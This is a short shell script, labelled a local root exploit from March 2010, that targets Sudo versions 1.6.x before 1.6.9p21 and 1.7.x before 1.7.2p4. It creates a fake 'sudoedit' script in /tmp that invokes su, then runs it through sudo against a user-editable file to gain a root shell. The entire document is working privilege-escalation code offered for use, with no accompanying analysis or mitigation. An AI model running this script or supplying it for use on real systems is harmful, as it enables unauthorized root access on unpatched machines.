#!/bin/sh
# Tod Miller Sudo 1.6.x before 1.6.9p21 and 1.7.x before 1.7.2p4
# local root exploit
# March 2010
# automated by kingcope
# Full Credits to Slouching
echo Tod Miller Sudo local root exploit
echo by Slouching
echo automated by kingcope
if [ $# != 1 ]
then
echo "usage: ./sudoxpl.sh <file you have permission to edit>"
exit
fi
cd /tmp
cat > sudoedit << _EOF
#!/bin/sh
echo ALEX-ALEX
su
/bin/su
/usr/bin/su
_EOF
chmod a+x ./sudoedit
sudo ./sudoedit $1
